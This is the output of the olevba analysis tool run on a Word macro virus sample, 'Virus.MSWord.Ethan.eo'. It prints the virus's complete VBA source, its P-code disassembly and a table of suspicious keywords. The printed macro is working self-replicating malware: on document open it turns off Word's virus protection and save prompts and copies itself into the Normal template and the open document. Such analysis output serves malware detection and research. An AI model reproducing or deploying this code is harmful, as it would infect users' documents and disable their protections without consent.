olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.eo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.eo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Application.EnableCancelKey = wdCancelDisabled
With Options:
With Options:
    .ConfirmConversions = False:
    .ConfirmConversions = False:
    .VirusProtection = False:
    .VirusProtection = False:
    .SaveNormalPrompt = False:
    .SaveNormalPrompt = False:
    .SavePropertiesPrompt = False:
    .SavePropertiesPrompt = False:
End With
End With
s = ActiveDocument.Saved
s = ActiveDocument.Saved
sName = "c:\evolve.tmp"
sName = "c:\evolve.tmp"
sFunc = "Private Sub Document_Open()"
sFunc = "Private Sub Document_Open()"
Found = False
Found = False
If Dir(sName) <> "" Then Kill sName
If Dir(sName) <> "" Then Kill sName
Open sName For Output As #1
Open sName For Output As #1
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Found = False And (a = sFunc) Then Found = True
    If a <> "" And Found = True Then Print #1, a
    If a = "End Sub" And Found = True Then Found = False
Next i
Close #1
j = 1
k = 1
t = 0
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
    t = t + 1
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
    t = t + 2
End If
If t > 0 Then
    Open sName For Input As #1
    If LOF(1) = 0 Then GoTo quit
    i = 1
    Do While Not EOF(1)
        Line Input #1, a
        If t = 1 Or t = 3 Then
            nml.CodeModule.InsertLines j, a
            j = j + 1
        End If
        If t = 2 Or t = 3 Then
            atv.CodeModule.InsertLines k, a
            k = k + 1
        End If
    Loop
quit:
    Close #1
End If
With Dialogs(wdDialogFileSumaryInfo):
    .Title = "Ethan Frome":
    .Author = "EW/LN/CB":
    .Keywrds = "Ethan":
    .Execute:
End With
If Left(ActiveDocument.Name, 8) <> "Document" Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
Kill sName
Application.EnableCancelKey = wdCancelInterrupt
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.eo
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4416 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #5:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #6:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #7:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' Line #8:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' Line #9:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' Line #13:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' 	BoS 0x0000 
' Line #14:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' 	BoS 0x0000 
' Line #15:
' 	EndWith 
' Line #16:
' 	EndWith 
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #18:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #19:
' 	LitStr 0x000D "c:\evolve.tmp"
' 	St sName 
' Line #20:
' 	LitStr 0x000D "c:\evolve.tmp"
' 	St sName 
' Line #21:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St sFunc 
' Line #22:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St sFunc 
' Line #23:
' 	LitVarSpecial (False)
' 	St Found 
' Line #24:
' 	LitVarSpecial (False)
' 	St Found 
' Line #25:
' 	Ld sName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #26:
' 	Ld sName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #27:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #28:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #30:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #31:
' 	Ld Found 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld a 
' 	Ld sFunc 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Found 
' 	EndIf 
' Line #32:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' 	EndIf 
' Line #33:
' 	Ld a 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Found 
' 	EndIf 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #36:
' 	LitDI2 0x0001 
' 	St j 
' Line #37:
' 	LitDI2 0x0001 
' 	St k 
' Line #38:
' 	LitDI2 0x0000 
' 	St t 
' Line #39:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #40:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nml 
' Line #41:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #44:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set atv 
' Line #45:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Add 
' 	St t 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	Ld t 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #48:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #49:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo quit 
' 	EndIf 
' Line #50:
' 	LitDI2 0x0001 
' 	St i 
' Line #51:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #53:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #54:
' 	Ld j 
' 	Ld a 
' 	Ld nml 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #55:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #58:
' 	Ld k 
' 	Ld a 
' 	Ld atv 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #59:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Loop 
' Line #62:
' 	Label quit 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	StartWithExpr 
' 	Ld wdDialogFileSumaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' Line #66:
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' Line #67:
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' Line #68:
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywrds 
' 	BoS 0x0000 
' Line #69:
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' Line #70:
' 	EndWith 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #72:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #75:
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' Line #76:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #77:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

